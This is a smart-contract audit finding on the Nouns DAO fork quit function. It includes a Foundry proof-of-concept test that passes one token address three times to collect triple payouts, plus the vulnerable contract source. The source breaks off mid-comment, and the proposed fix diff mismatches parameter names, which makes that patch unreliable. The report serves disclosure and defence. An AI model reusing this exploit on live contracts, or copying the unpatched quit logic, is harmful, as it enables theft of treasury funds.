{
  "Title": "[H-01] User can steal tokens by using duplicated ERC20 tokens as parameter in `NounsDAOLogicV1Fork.quit`",
  "Content": "\nCalling [NounsDAOLogicV1Fork.quit](https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L206-L216) by using dupliated ERC20 tokens, malicious user can gain more ERC20 tokens than he/she is supposed to, even drain all ERC20 tokens.\n\n### Proof of Concept\n\nIn function, [NounsDAOLogicV1Fork.quit](https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L206-L216), `erc20TokensToInclude` is used to specified tokens a user wants to get, but since the function doesn't verify if `erc20TokensToInclude` contains dupliated tokens, it's possible that a malicious user calls the function by specify the ERC20 more than once to get more share tokens.\n\n```solidity\n    function quit(uint256[] calldata tokenIds, address[] memory erc20TokensToInclude) external nonReentrant {\n        // check that erc20TokensToInclude is a subset of `erc20TokensToIncludeInQuit`\n        address[] memory erc20TokensToIncludeInQuit_ = erc20TokensToIncludeInQuit;\n        for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {\n            if (!isAddressIn(erc20TokensToInclude[i], erc20TokensToIncludeInQuit_)) {\n                revert TokensMustBeASubsetOfWhitelistedTokens();\n            }\n        }\n\n        quitInternal(tokenIds, erc20TokensToInclude);\n    }\n\n    function quitInternal(uint256[] calldata tokenIds, address[] memory erc20TokensToInclude) internal {\n        checkGovernanceActive();\n\n        uint256 totalSupply = adjustedTotalSupply();\n\n        for (uint256 i = 0; i < tokenIds.length; i++) {\n            nouns.transferFrom(msg.sender, address(timelock), tokenIds[i]);\n        }\n\n        uint256[] memory balancesToSend = new uint256[](erc20TokensToInclude.length);\n\n        // Capture balances to send before actually sending them, to avoid the risk of external calls changing balances.\n        uint256 ethToSend = (address(timelock).balance * tokenIds.length) / totalSupply;\n        for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {\n            IERC20 erc20token = IERC20(erc20TokensToInclude[i]);\n            balancesToSend[i] = (erc20token.balanceOf(address(timelock)) * tokenIds.length) / totalSupply;\n        }\n\n        // Send ETH and ERC20 tokens\n        timelock.sendETH(payable(msg.sender), ethToSend);\n        for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {\n            if (balancesToSend[i] > 0) {\n                timelock.sendERC20(msg.sender, erc20TokensToInclude[i], balancesToSend[i]);\n            }\n        }\n\n        emit Quit(msg.sender, tokenIds);\n    }\n```\n\nAdd the following code in test/foundry/governance/fork/NounsDAOLogicV1Fork.t.sol file `NounsDAOLogicV1Fork_Quit_Test` contract,\nand run `forge test --ffi --mt test_quit_allowsChoosingErc20TokensToIncludeTwice`.\n\n```solidity\n    function test_quit_allowsChoosingErc20TokensToIncludeTwice() public {\n        vm.prank(quitter);\n        address[] memory tokensToInclude = new address[](3);\n        //****************************\n        // specify token2 three times\n        //****************************\n        tokensToInclude[0] = address(token2);\n        tokensToInclude[1] = address(token2);\n        tokensToInclude[2] = address(token2);\n        dao.quit(quitterTokens, tokensToInclude);\n\n        assertEq(quitter.balance, 24 ether);\n        assertEq(token1.balanceOf(quitter), 0);\n        //****************************\n        // get 3 time tokens\n        //****************************\n        assertEq(token2.balanceOf(quitter), 3 * (TOKEN2_BALANCE * 2) / 10);\n     }\n```\n\n### Tools Used\n\nVS\n\n### Recommended Mitigation Steps\n\nBy using function `checkForDuplicates` to prevent the issue\n\n```diff\n--- NounsDAOLogicV1Fork.sol\t2023-07-12 21:32:56.925848531 +0800\n+++ NounsDAOLogicV1ForkNew.sol\t2023-07-12 21:32:34.006158294 +0800\n@@ -203,8 +203,9 @@\n         quitInternal(tokenIds, erc20TokensToIncludeInQuit);\n     }\n \n-    function quit(uint256[] calldata tokenIds, address[] memory erc20TokensToInclude) external nonReentrant {\n+    function quit(uint256[] calldata tokenIds, address[] memory erc20tokenstoinclude) external nonReentrant {\n         // check that erc20TokensToInclude is a subset of `erc20TokensToIncludeInQuit`\n+        checkForDuplicates(erc20tokenstoinclude);\n         address[] memory erc20TokensToIncludeInQuit_ = erc20TokensToIncludeInQuit;\n         for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {\n             if (!isAddressIn(erc20TokensToInclude[i], erc20TokensToIncludeInQuit_)) {\n\n```\n\n**[eladmallel (Nouns DAO) confirmed and commented](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/102#issuecomment-1644585861):**\n > Fix PR: https://github.com/nounsDAO/nouns-monorepo/pull/762\n\n**[gzeon (judge) increased severity to High](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/102#issuecomment-1647519228)**\n\n\n\n***\n\n \n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2023-07-nounsdao",
  "Code": [
    {
      "filename": "packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol",
      "content": "// SPDX-License-Identifier: BSD-3-Clause\n\n/// @title The Nouns DAO logic version 1\n\n/*********************************\n * ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ *\n * ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ *\n * ░░░░░░█████████░░█████████░░░ *\n * ░░░░░░██░░░████░░██░░░████░░░ *\n * ░░██████░░░████████░░░████░░░ *\n * ░░██░░██░░░████░░██░░░████░░░ *\n * ░░██░░██░░░████░░██░░░████░░░ *\n * ░░░░░░█████████░░█████████░░░ *\n * ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ *\n * ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░ *\n *********************************/\n\n// LICENSE\n// NounsDAOLogicV1Fork.sol is a modified version of NounsDAOLogicV1.sol.\n// NounsDAOLogicV1.sol is a modified version of Compound Lab's GovernorBravoDelegate.sol:\n// https://github.com/compound-finance/compound-protocol/blob/b9b14038612d846b83f8a009a82c38974ff2dcfe/contracts/Governance/GovernorBravoDelegate.sol\n//\n// GovernorBravoDelegate.sol source code Copyright 2020 Compound Labs, Inc. licensed under the BSD-3-Clause license.\n// With modifications by Nounders DAO.\n//\n// Additional conditions of BSD-3-Clause can be found here: https://opensource.org/licenses/BSD-3-Clause\n//\n// MODIFICATIONS\n// NounsDAOLogicV1Fork adds:\n// - `quit(tokenIds)`, a function that allows token holders to quit the DAO, taking their pro rata funds,\n//   and sending their tokens to the DAO treasury.\n//\n// - `adjustedTotalSupply`, the total supply calculation used in DAO functions like quorum and proposal threshold, in\n//   which the DAO exludes tokens held by the treasury, such that tokens used to quit the DAO are not counted.\n//\n// - A function for the DAO to set which ERC20s are transferred pro rata in the `quit` function.\n//\n// - A new proposals getter function, since adding new fields to Proposal results in the default getter hitting a\n//   `Stack too deep` error.\n//\n// - A new Proposal field: `creationBlock`, used to resolve the `votingDelay` bug, in which editing `votingDelay` would\n//  change the votes snapshot block for proposals in-progress.\n//\n// NounsDAOLogicV1Fork modifies:\n// - The proxy pattern from Compound's old Transparent-like proxy, to OpenZeppelin's recommended UUPS pattern.\n//\n// - `propose`\n//   - uses `adjustedTotalSupply`\n//   - includes a new 'delayed governance' feature which gives forkers from the original DAO time to claim their tokens\n//     with this new DAO; proposals are not allowed until all tokens are claimed, or until the delay expiration\n//     timestamp is reached.\n//\n// - `cancel` bugfix, allowing proposals to be canceled by anyone if the proposer's vote balance is equal to proposal\n//   threshold.\n//\n// - Removes the vetoer role and logic related to it. The quit function provides minority protection instead of the\n//   vetoer, and fork DAOs can upgrade their governor to include the vetoer feature if it's needed.\n//\n// - Modified MIN_VOTING_PERIOD, MAX_VOTING_PERIOD to correct block numbers assuming 12 second blocks\n// - Modified MAX_VOTING_DELAY to be 2 weeks\n//\n// NounsDAOLogicV1 adds:\n// - Proposal Threshold basis points instead of fixed number\n//   due to the Noun token's increasing supply\n//\n// - Quorum Votes basis points instead of fixed number\n//   due to the Noun token's increasing supply\n//\n// - Per proposal storing of fixed `proposalThreshold`\n//   and `quorumVotes` calculated using the Noun token's total supply\n//   at the block the proposal was created and the basis point parameters\n//\n// - `ProposalCreatedWithRequirements` event that emits `ProposalCreated` parameters with\n//   the addition of `proposalThreshold` and `quorumVotes`\n//\n// - Votes are counted from the block a proposal is created instead of\n//   the proposal's voting start block to align with the parameters\n//   stored with the proposal\n//\n// - Veto ability which allows `vetoer` to halt any proposal at any stage unless\n//   the proposal is executed.\n//   The `veto(uint proposalId)` logic is a modified version of `cancel(uint proposalId)`\n//   A `vetoed` flag was added to the `Proposal` struct to support this.\n//\n// NounsDAOLogicV1 removes:\n// - `initialProposalId` and `_initiate()` due to this being the\n//   first instance of the governance contract unlike\n//   GovernorBravo which upgrades GovernorAlpha\n//\n// - Value passed along using `timelock.executeTransaction{value: proposal.value}`\n//   in `execute(uint proposalId)`. This contract should not hold funds and does not\n//   implement `receive()` or `fallback()` functions.\n//\n\npragma solidity ^0.8.19;\n\nimport { UUPSUpgradeable } from '@openzeppelin/contracts/proxy/utils/UUPSUpgradeable.sol';\nimport { NounsDAOEventsFork } from './NounsDAOEventsFork.sol';\nimport { NounsDAOStorageV1Fork } from './NounsDAOStorageV1Fork.sol';\nimport { NounsDAOExecutorV2 } from '../../../NounsDAOExecutorV2.sol';\nimport { INounsTokenForkLike } from './INounsTokenForkLike.sol';\nimport { IERC20 } from '@openzeppelin/contracts/token/ERC20/IERC20.sol';\nimport { ReentrancyGuardUpgradeable } from '@openzeppelin/contracts-upgradeable/security/ReentrancyGuardUpgradeable.sol';\n\ncontract NounsDAOLogicV1Fork is UUPSUpgradeable, ReentrancyGuardUpgradeable, NounsDAOStorageV1Fork, NounsDAOEventsFork {\n    error AdminOnly();\n    error WaitingForTokensToClaimOrExpiration();\n    error TokensMustBeASubsetOfWhitelistedTokens();\n    error GovernanceBlockedDuringForkingPeriod();\n    error DuplicateTokenAddress();\n\n    event ERC20TokensToIncludeInQuitSet(address[] oldErc20Tokens, address[] newErc20tokens);\n    event Quit(address indexed msgSender, uint256[] tokenIds);\n\n    /// @notice The name of this contract\n    string public constant name = 'Nouns DAO';\n\n    /// @notice The minimum setable proposal threshold\n    uint256 public constant MIN_PROPOSAL_THRESHOLD_BPS = 1; // 1 basis point or 0.01%\n\n    /// @notice The maximum setable proposal threshold\n    uint256 public constant MAX_PROPOSAL_THRESHOLD_BPS = 1_000; // 1,000 basis points or 10%\n\n    /// @notice The minimum setable voting period\n    uint256 public constant MIN_VOTING_PERIOD = 7_200; // 24 hours\n\n    /// @notice The max setable voting period\n    uint256 public constant MAX_VOTING_PERIOD = 100_800; // 2 weeks\n\n    /// @notice The min setable voting delay\n    uint256 public constant MIN_VOTING_DELAY = 1;\n\n    /// @notice The max setable voting delay\n    uint256 public constant MAX_VOTING_DELAY = 100_800; // 2 weeks\n\n    /// @notice The minimum setable quorum votes basis points\n    uint256 public constant MIN_QUORUM_VOTES_BPS = 200; // 200 basis points or 2%\n\n    /// @notice The maximum setable quorum votes basis points\n    uint256 public constant MAX_QUORUM_VOTES_BPS = 2_000; // 2,000 basis points or 20%\n\n    /// @notice The maximum number of actions that can be included in a proposal\n    uint256 public constant proposalMaxOperations = 10; // 10 actions\n\n    /// @notice The EIP-712 typehash for the contract's domain\n    bytes32 public constant DOMAIN_TYPEHASH =\n        keccak256('EIP712Domain(string name,uint256 chainId,address verifyingContract)');\n\n    /// @notice The EIP-712 typehash for the ballot struct used by the contract\n    bytes32 public constant BALLOT_TYPEHASH = keccak256('Ballot(uint256 proposalId,uint8 support)');\n\n    /**\n     * @notice Used to initialize the contract during delegator contructor\n     * @dev Not asserting that param values are within the hard-coded bounds in order to make it easier to run\n     * manual tests; seems a safe decision since we assume fork DAOs are initialized by `ForkDAODeployer`\n     * @param timelock_ The address of the NounsDAOExecutor\n     * @param nouns_ The address of the NOUN tokens\n     * @param votingPeriod_ The initial voting period\n     * @param votingDelay_ The initial voting delay\n     * @param proposalThresholdBPS_ The initial proposal threshold in basis points\n     * @param quorumVotesBPS_ The initial quorum votes threshold in basis points\n     * @param erc20TokensToIncludeInQuit_ The initial list of ERC20 tokens to include when quitting\n     * @param delayedGovernanceExpirationTimestamp_ The delayed governance expiration timestamp\n     */\n    function initialize(\n        address timelock_,\n        address nouns_,\n        uint256 votingPeriod_,\n        uint256 votingDelay_,\n        uint256 proposalThresholdBPS_,\n        uint256 quorumVotesBPS_,\n        address[] memory erc20TokensToIncludeInQuit_,\n        uint256 delayedGovernanceExpirationTimestamp_\n    ) public virtual {\n        __ReentrancyGuard_init_unchained();\n        require(address(timelock) == address(0), 'NounsDAO::initialize: can only initialize once');\n        require(timelock_ != address(0), 'NounsDAO::initialize: invalid timelock address');\n        require(nouns_ != address(0), 'NounsDAO::initialize: invalid nouns address');\n\n        emit VotingPeriodSet(votingPeriod, votingPeriod_);\n        emit VotingDelaySet(votingDelay, votingDelay_);\n        emit ProposalThresholdBPSSet(proposalThresholdBPS, proposalThresholdBPS_);\n        emit QuorumVotesBPSSet(quorumVotesBPS, quorumVotesBPS_);\n\n        admin = timelock_;\n        timelock = NounsDAOExecutorV2(payable(timelock_));\n        nouns = INounsTokenForkLike(nouns_);\n        votingPeriod = votingPeriod_;\n        votingDelay = votingDelay_;\n        proposalThresholdBPS = proposalThresholdBPS_;\n        quorumVotesBPS = quorumVotesBPS_;\n        erc20TokensToIncludeInQuit = erc20TokensToIncludeInQuit_;\n        delayedGovernanceExpirationTimestamp = delayedGovernanceExpirationTimestamp_;\n    }\n\n    /**\n     * @notice A function that allows token holders to quit the DAO, taking their pro rata funds,\n     * and sending their tokens to the DAO treasury.\n     * Will revert as long as not all tokens were claimed, and as long as the delayed governance has not expired.\n     * @param tokenIds The token ids to quit with\n     */\n    function quit(uint256[] calldata tokenIds) external nonReentrant {\n        quitInternal(tokenIds, erc20TokensToIncludeInQuit);\n    }\n\n    function quit(uint256[] calldata tokenIds, address[] memory erc20TokensToInclude) external nonReentrant {\n        // check that erc20TokensToInclude is a subset of `erc20TokensToIncludeInQuit`\n        address[] memory erc20TokensToIncludeInQuit_ = erc20TokensToIncludeInQuit;\n        for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {\n            if (!isAddressIn(erc20TokensToInclude[i], erc20TokensToIncludeInQuit_)) {\n                revert TokensMustBeASubsetOfWhitelistedTokens();\n            }\n        }\n\n        quitInternal(tokenIds, erc20TokensToInclude);\n    }\n\n    function quitInternal(uint256[] calldata tokenIds, address[] memory erc20TokensToInclude) internal {\n        checkGovernanceActive();\n\n        uint256 totalSupply = adjustedTotalSupply();\n\n        for (uint256 i = 0; i < tokenIds.length; i++) {\n            nouns.transferFrom(msg.sender, address(timelock), tokenIds[i]);\n        }\n\n        uint256[] memory balancesToSend = new uint256[](erc20TokensToInclude.length);\n\n        // Capture balances to send before actually sending them, to avoid the risk of external calls changing balances.\n        uint256 ethToSend = (address(timelock).balance * tokenIds.length) / totalSupply;\n        for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {\n            IERC20 erc20token = IERC20(erc20TokensToInclude[i]);\n            balancesToSend[i] = (erc20token.balanceOf(address(timelock)) * tokenIds.length) / totalSupply;\n        }\n\n        // Send ETH and ERC20 tokens\n        timelock.sendETH(payable(msg.sender), ethToSend);\n        for (uint256 i = 0; i < erc20TokensToInclude.length; i++) {\n            if (balancesToSend[i] > 0) {\n                timelock.sendERC20(msg.sender, erc20TokensToInclude[i], balancesToSend[i]);\n            }\n        }\n\n        emit Quit(msg.sender, tokenIds);\n    }\n\n    function isAddressIn(address a, address[] memory addresses) internal pure returns (bool) {\n        for (uint256 i = 0; i < addresses.length; i++) {\n            if (addresses[i] == a) return true;\n        }\n        return false;\n    }\n\n    struct ProposalTemp {\n        uint256 totalSupply;\n        uint256 proposalThreshold;\n        uint256 latestProposalId;\n        uint256 startBlock;\n        uint256 endBlock;\n    }\n\n    /**\n     * @notice Function used to propose a new proposal. Sender must have delegates above the proposal threshold\n     * Will revert as long as not all tokens were claimed, and as long as the delayed governance has not expired.\n     * @param targets Target addresses for proposal calls\n     * @param values Eth values for proposal calls\n     * @param signatures Function signatures for proposal calls\n     * @param calldatas Calldatas for proposal calls\n     * @param description String description of the proposal\n     * @return Proposal id of new proposal\n     */\n    function propose(\n        address[] memory targets,\n        uint256[] memory values,\n        string[] memory signatures,\n        bytes[] memory calldatas,\n        string memory description\n    ) public returns (uint256) {\n        checkGovernanceActive();\n\n        ProposalTemp memory temp;\n\n        temp.totalSupply = adjustedTotalSupply();\n\n        temp.proposalThreshold = bps2Uint(proposalThresholdBPS, temp.totalSupply);\n\n        require(\n            nouns.getPriorVotes(msg.sender, block.number - 1) > temp.proposalThreshold,\n            'NounsDAO::propose: proposer votes below proposal threshold'\n        );\n        require(\n            targets.length == values.length &&\n                targets.length == signatures.length &&\n                targets.length == calldatas.length,\n            'NounsDAO::propose: proposal function information arity mismatch'\n        );\n        require(targets.length != 0, 'NounsDAO::propose: must provide actions');\n        require(targets.length <= proposalMaxOperations, 'NounsDAO::propose: too many actions');\n\n        temp.latestProposalId = latestProposalIds[msg.sender];\n        if (temp.latestProposalId != 0) {\n            ProposalState proposersLatestProposalState = state(temp.latestProposalId);\n            require(\n                proposersLatestProposalState != ProposalState.Active,\n                'NounsDAO::propose: one live proposal per proposer, found an already active proposal'\n            );\n            require(\n                proposersLatestProposalState != ProposalState.Pending,\n                'NounsDAO::propose: one live proposal per proposer, found an already pending proposal'\n            );\n        }\n\n        temp.startBlock = block.number + votingDelay;\n        temp.endBlock = temp.startBlock + votingPeriod;\n\n        proposalCount++;\n        Proposal storage newProposal = _proposals[proposalCount];\n\n        newProposal.id = proposalCount;\n        newProposal.proposer = msg.sender;\n        newProposal.proposalThreshold = temp.proposalThreshold;\n        newProposal.quorumVotes = bps2Uint(quorumVotesBPS, temp.totalSupply);\n        newProposal.eta = 0;\n        newProposal.targets = targets;\n        newProposal.values = values;\n        newProposal.signatures = signatures;\n        newProposal.calldatas = calldatas;\n        newProposal.startBlock = temp.startBlock;\n        newProposal.endBlock = temp.endBlock;\n        newProposal.forVotes = 0;\n        newProposal.againstVotes = 0;\n        newProposal.abstainVotes = 0;\n        newProposal.canceled = false;\n        newProposal.executed = false;\n        newProposal.creationBlock = block.number;\n\n        latestProposalIds[newProposal.proposer] = newProposal.id;\n\n        /// @notice Maintains backwards compatibility with GovernorBravo events\n        emit ProposalCreated(\n            newProposal.id,\n            msg.sender,\n            targets,\n            values,\n            signatures,\n            calldatas,\n            newProposal.startBlock,\n            newProposal.endBlock,\n            description\n        );\n\n        /// @notice Updated event with `proposalThreshold` and `quorumVotes`\n        emit ProposalCreatedWithRequirements(\n            newProposal.id,\n            msg.sender,\n            targets,\n            values,\n            signatures,\n            calldatas,\n            newProposal.startBlock,\n            newProposal.endBlock,\n            newProposal.proposalThreshold,\n            newProposal.quorumVotes,\n            description\n        );\n\n        return newProposal.id;\n    }\n\n    /**\n     * @notice Internal function that reverts if the governance is not active yet. Governance becomes active as soon as\n     * the forking period ended and one of these conditions is met:\n     * 1. All tokens are claimed\n     * 2. The delayed governance expiration timestamp is reached\n     */\n    function checkGovernanceActive() internal view {\n        if (block.timestamp < nouns.forkingPeriodEndTimestamp()) {\n            revert GovernanceBlockedDuringForkingPeriod();\n        }\n\n        if (block.timestamp < delayedGovernanceExpirationTimestamp && nouns.remainingTokensToClaim() > 0) {\n            revert WaitingForTokensToClaimOrExpiration();\n        }\n    }\n\n    /**\n     * @notice Queues a proposal of state succeeded\n     * @param proposalId The id of the proposal to queue\n     */\n    function queue(uint256 proposalId) external {\n        require(\n            state(proposalId) == ProposalState.Succeeded,\n            'NounsDAO::queue: proposal can only be queued if it is succeeded'\n        );\n        Proposal storage proposal = _proposals[proposalId];\n        uint256 eta = block.timestamp + timelock.delay();\n        for (uint256 i = 0; i < proposal.targets.length; i++) {\n            queueOrRevertInternal(\n                proposal.targets[i],\n                proposal.values[i],\n                proposal.signatures[i],\n                proposal.calldatas[i],\n                eta\n            );\n        }\n        proposal.eta = eta;\n        emit ProposalQueued(proposalId, eta);\n    }\n\n    function queueOrRevertInternal(\n        address target,\n        uint256 value,\n        string memory signature,\n        bytes memory data,\n        uint256 eta\n    ) internal {\n        require(\n            !timelock.queuedTransactions(keccak256(abi.encode(target, value, signature, data, eta))),\n            'NounsDAO::queueOrRevertInternal: identical proposal action already queued at eta'\n        );\n        timelock.queueTransaction(target, value, signature, data, eta);\n    }\n\n    /**\n     * @notice Executes a queued proposal if eta has passed\n     * @param proposalId The id of the proposal to execute\n     */\n    function execute(uint256 proposalId) external {\n        require(\n            state(proposalId) == ProposalState.Queued,\n            'NounsDAO::execute: proposal can only be executed if it is queued'\n        );\n        Proposal storage proposal = _proposals[proposalId];\n        proposal.executed = true;\n        for (uint256 i = 0; i < proposal.targets.length; i++) {\n            timelock.executeTransaction(\n                proposal.targets[i],\n                proposal.values[i],\n                proposal.signatures[i],\n                proposal.calldatas[i],\n                proposal.eta\n            );\n        }\n        emit ProposalExecuted(proposalId);\n    }\n\n    /**\n     * @notice Cancels a proposal only if sender is the proposer, or proposer delegates dropped below proposal threshold\n     * @param proposalId The id of the proposal to cancel\n     */\n    function cancel(uint256 proposalId) external {\n        require(state(proposalId) != ProposalState.Executed, 'NounsDAO::cancel: cannot cancel executed proposal');\n\n        Proposal storage proposal = _proposals[proposalId];\n        require(\n            msg.sender == proposal.proposer ||\n                nouns.getPriorVotes(proposal.proposer, block.number - 1) <= proposal.proposalThreshold,\n            'NounsDAO::cancel: proposer above threshold'\n        );\n\n        proposal.canceled = true;\n        for (uint256 i = 0; i < proposal.targets.length; i++) {\n            timelock.cancelTransaction(\n                proposal.targets[i],\n                proposal.values[i],\n                proposal.signatures[i],\n                proposal.calldatas[i],\n                proposal.eta\n            );\n        }\n\n        emit ProposalCanceled(proposalId);\n    }\n\n    /**\n     * @notice Gets actions of a proposal\n     * @param proposalId the id of the proposal\n     * @return targets\n     * @return values\n     * @return signatures\n     * @return calldatas\n     */\n    function getActions(uint256 proposalId)\n        external\n        view\n        returns (\n            address[] memory targets,\n            uint256[] memory values,\n            string[] memory signatures,\n            bytes[] memory calldatas\n        )\n    {\n        Proposal storage p = _proposals[proposalId];\n        return (p.targets, p.values, p.signatures, p.calldatas);\n    }\n\n    /**\n     * @notice Gets the receipt for a voter on a given proposal\n     * @param proposalId the id of proposal\n     * @param voter The address of the voter\n     * @return The voting receipt\n     */\n    function getReceipt(uint256 proposalId, address voter) external view returns (Receipt memory) {\n        return _proposals[proposalId].receipts[voter];\n    }\n\n    /**\n     * @notice Gets the state of a proposal\n     * @param proposalId The id of the proposal\n     * @return Proposal state\n     */\n    function state(uint256 proposalId) public view returns (ProposalState) {\n        require(proposalCount >= proposalId, 'NounsDAO::state: invalid proposal id');\n        Proposal storage proposal = _proposals[proposalId];\n        if (proposal.canceled) {\n            return ProposalState.Canceled;\n        } else if (block.number <= proposal.startBlock) {\n            return ProposalState.Pending;\n        } else if (block.number <= proposal.endBlock) {\n            return ProposalState.Active;\n        } else if (proposal.forVotes <= proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) {\n            return ProposalState.Defeated;\n        } else if (proposal.eta == 0) {\n            return ProposalState.Succeeded;\n        } else if (proposal.executed) {\n            return ProposalState.Executed;\n        } else if (block.timestamp >= proposal.eta + timelock.GRACE_PERIOD()) {\n            return ProposalState.Expired;\n        } else {\n            return ProposalState.Queued;\n        }\n    }\n\n    /**\n     * @notice Returns the proposal details given a proposal id.\n     * @dev this explicit getter solves the `Stack too deep` problem that arose after\n     * adding a new field to the Proposal struct.\n     * @param proposalId the proposal id to get the data for\n     * @return A `ProposalCondensed` struct with the proposal data\n     */\n    function proposals(uint256 proposalId) external view returns (ProposalCondensed memory) {\n        Proposal storage proposal = _proposals[proposalId];\n        return\n            ProposalCondensed({\n                id: proposal.id,\n                proposer: proposal.proposer,\n                proposalThreshold: proposal.proposalThreshold,\n                quorumVotes: proposal.quorumVotes,\n                eta: proposal.eta,\n                startBlock: proposal.startBlock,\n                endBlock: proposal.endBlock,\n                forVotes: proposal.forVotes,\n                againstVotes: proposal.againstVotes,\n                abstainVotes: proposal.abstainVotes,\n                canceled: proposal.canceled,\n                executed: proposal.executed,\n                creationBlock: proposal.creationBlock\n            });\n    }\n\n    /**\n     * @notice Cast a vote for a proposal\n     * @param proposalId The id of the proposal to vote on\n     * @param support The support value for the vote. 0=against, 1=for, 2=abstain\n     */\n    function castVote(uint256 proposalId, uint8 support) external {\n        emit VoteCast(msg.sender, proposalId, support, castVoteInternal(msg.sender, proposalId, support), '');\n    }\n\n    /**\n     * @notice Cast a vote for a proposal with a reason\n     * @param proposalId The id of the proposal to vote on\n     * @param support The support value for the vote. 0=against, 1=for, 2=abstain\n     * @param reason The reason given for the vote by the voter\n     */\n    function castVoteWithReason(\n        uint256 proposalId,\n        uint8 support,\n        string calldata reason\n    ) external {\n        emit VoteCast(msg.sender, proposalId, support, castVoteInternal(msg.sender, proposalId, support), reason);\n    }\n\n    /**\n     * @notice Cast a vote for a proposal by signature\n     * @dev External function that accepts EIP-712 signatures for voting on proposals.\n     */\n    function castVoteBySig(\n        uint256 proposalId,\n        uint8 support,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external {\n        bytes32 domainSeparator = keccak256(\n            abi.encode(DOMAIN_TYPEHASH, keccak256(bytes(name)), block.chainid, address(this))\n        );\n        bytes32 structHash = keccak256(abi.encode(BALLOT_TYPEHASH, proposalId, support));\n        bytes32 digest = keccak256(abi.encodePacked('\\x19\\x01', domainSeparator, structHash));\n        address signatory = ecrecover(digest, v, r, s);\n        require(signatory != address(0), 'NounsDAO::castVoteBySig: invalid signature');\n        emit VoteCast(signatory, proposalId, support, castVoteInternal(signatory, proposalId, support), '');\n    }\n\n    /**\n     * @notice Internal function that caries out voting logic\n     * @param voter The voter that is casting their vote\n     * @param proposalId The id of the proposal to vote on\n     * @param support The support value for the vote. 0=against, 1=for, 2=abstain\n     * @return The number of votes cast\n     */\n    function castVoteInternal(\n        address voter,\n        uint256 proposalId,\n        uint8 support\n    ) internal returns (uint96) {\n        require(state(proposalId) == ProposalState.Active, 'NounsDAO::castVoteInternal: voting is closed');\n        require(support <= 2, 'NounsDAO::castVoteInternal: invalid vote type');\n        Proposal storage proposal = _proposals[proposalId];\n        Receipt storage receipt = proposal.receipts[voter];\n        require(receipt.hasVoted == false, 'NounsDAO::castVoteInternal: voter already voted');\n\n        /// @notice: Unlike GovernerBravo, votes are considered from the block the proposal was created in order to normalize quorumVotes and proposalThreshold metrics\n        uint96 votes = nouns.getPriorVotes(voter, proposal.creationBlock);\n\n        if (support == 0) {\n            proposal.againstVotes = proposal.againstVotes + votes;\n        } else if (support == 1) {\n            proposal.forVotes = proposal.forVotes + votes;\n        } else if (support == 2) {\n            proposal.abstainVotes = proposal.abstainVotes + votes;\n        }\n\n        receipt.hasVoted = true;\n        receipt.support = support;\n        receipt.votes = votes;\n\n        return votes;\n    }\n\n    /**\n     * @notice Admin function for setting the voting delay\n     * @param newVotingDelay new voting delay, in blocks\n     */\n    function _setVotingDelay(uint256 newVotingDelay) external {\n        require(msg.sender == admin, 'NounsDAO::_setVotingDelay: admin only');\n        require(\n            newVotingDelay >= MIN_VOTING_DELAY && newVotingDelay <= MAX_VOTING_DELAY,\n            'NounsDAO::_setVotingDelay: invalid voting delay'\n        );\n        uint256 oldVotingDelay = votingDelay;\n        votingDelay = newVotingDelay;\n\n        emit VotingDelaySet(oldVotingDelay, newVotingDelay);\n    }\n\n    /**\n     * @notice Admin function for setting the voting period\n     * @param newVotingPeriod new voting period, in blocks\n     */\n    function _setVotingPeriod(uint256 newVotingPeriod) external {\n        require(msg.sender == admin, 'NounsDAO::_setVotingPeriod: admin only');\n        require(\n            newVotingPeriod >= MIN_VOTING_PERIOD && newVotingPeriod <= MAX_VOTING_PERIOD,\n            'NounsDAO::_setVotingPeriod: invalid voting period'\n        );\n        uint256 oldVotingPeriod = votingPeriod;\n        votingPeriod = newVotingPeriod;\n\n        emit VotingPeriodSet(oldVotingPeriod, newVotingPeriod);\n    }\n\n    /**\n     * @notice Admin function for setting the proposal threshold basis points\n     * @dev newProposalThresholdBPS must be greater than the hardcoded min\n     * @param newProposalThresholdBPS new proposal threshold\n     */\n    function _setProposalThresholdBPS(uint256 newProposalThresholdBPS) external {\n        require(msg.sender == admin, 'NounsDAO::_setProposalThresholdBPS: admin only');\n        require(\n            newProposalThresholdBPS >= MIN_PROPOSAL_THRESHOLD_BPS &&\n                newProposalThresholdBPS <= MAX_PROPOSAL_THRESHOLD_BPS,\n            'NounsDAO::_setProposalThreshold: invalid proposal threshold'\n        );\n        uint256 oldProposalThresholdBPS = proposalThresholdBPS;\n        proposalThresholdBPS = newProposalThresholdBPS;\n\n        emit ProposalThresholdBPSSet(oldProposalThresholdBPS, newProposalThresholdBPS);\n    }\n\n    /**\n     * @notice Admin function for setting the quorum votes basis points\n     * @dev newQuorumVotesBPS must be greater than the hardcoded min\n     * @param newQuorumVotesBPS new proposal threshold\n     */\n    function _setQuorumVotesBPS(uint256 newQuorumVotesBPS) external {\n        require(msg.sender == admin, 'NounsDAO::_setQuorumVotesBPS: admin only');\n        require(\n            newQuorumVotesBPS >= MIN_QUORUM_VOTES_BPS && newQuorumVotesBPS <= MAX_QUORUM_VOTES_BPS,\n            'NounsDAO::_setQuorumVotesBPS: invalid quorum votes basis points'\n        );\n        uint256 oldQuorumVotesBPS = quorumVotesBPS;\n        quorumVotesBPS = newQuorumVotesBPS;\n\n        emit QuorumVotesBPSSet(oldQuorumVotesBPS, newQuorumVotesBPS);\n    }\n\n    /**\n     * @notice Begins transfer of admin rights. The newPendingAdmin must call 